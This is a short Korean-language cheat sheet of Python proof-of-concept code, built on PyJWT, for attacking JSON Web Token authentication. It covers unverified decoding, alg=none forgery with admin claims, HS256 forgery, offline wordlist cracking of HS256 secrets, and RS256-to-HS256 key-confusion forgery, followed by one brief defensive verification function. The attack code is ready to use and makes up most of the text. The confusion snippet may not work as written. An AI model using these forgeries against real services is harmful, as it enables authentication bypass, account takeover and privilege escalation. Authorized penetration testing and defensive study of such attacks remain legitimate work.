# JWT / 인증 공격 (검증된 PoC)

허가된 테스트 전제. PyJWT 사용. 공격과 함께 방어도 명시.

## JWT 디코드 (검증 없이 헤더/페이로드 열람)
```python
import jwt

def peek(token: str) -> tuple[dict, dict]:
    header = jwt.get_unverified_header(token)
    payload = jwt.decode(token, options={"verify_signature": False})
    return header, payload
```

## alg=none 위조 (서버가 none 알고리즘 수용 시)
```python
import jwt

def forge_alg_none(payload: dict) -> str:
    # PyJWT는 none 알고리즘에 key=None 요구. 서명부가 빈 토큰 생성.
    return jwt.encode(payload, key=None, algorithm="none")

token = forge_alg_none({"user": "admin", "role": "admin"})
```

## 약한 HS256 시크릿으로 위조 (시크릿을 아는 경우)
```python
import jwt

def forge_hs256(payload: dict, secret: str) -> str:
    return jwt.encode(payload, key=secret, algorithm="HS256")
```

## HS256 시크릿 브루트포스 (캡처한 토큰 대상, 오프라인)
```python
import jwt

def crack_hs256(token: str, wordlist: list[str]) -> str | None:
    for candidate in wordlist:
        try:
            jwt.decode(token, candidate, algorithms=["HS256"])
            return candidate          # 검증 성공 = 시크릿 일치
        except jwt.InvalidSignatureError:
            continue
        except jwt.InvalidTokenError:
            return candidate          # 서명은 맞고 exp 등만 실패 → 시크릿은 맞음
    return None

# 사용: crack_hs256(tok, ["secret","password","123456","changeme"])
```

## RS256 → HS256 혼동 공격 (서버가 공개키를 HMAC 키로 쓰는 경우)
```python
import jwt

def forge_rs_to_hs(payload: dict, public_key_pem: str) -> str:
    # 서버가 alg를 토큰 헤더에서 신뢰하면: 공개키(알려진 값)를 HS256 시크릿으로 사용.
    return jwt.encode(payload, key=public_key_pem, algorithm="HS256")
```

## 방어 (서버 측 검증)
```python
import jwt

def verify_strict(token: str, secret: str) -> dict:
    # algorithms를 명시적으로 고정 → alg=none / 혼동공격 차단. exp 검증 활성.
    return jwt.decode(
        token, secret,
        algorithms=["HS256"],              # none·RS256 혼동 거부
        options={"require": ["exp"], "verify_exp": True},
    )
```
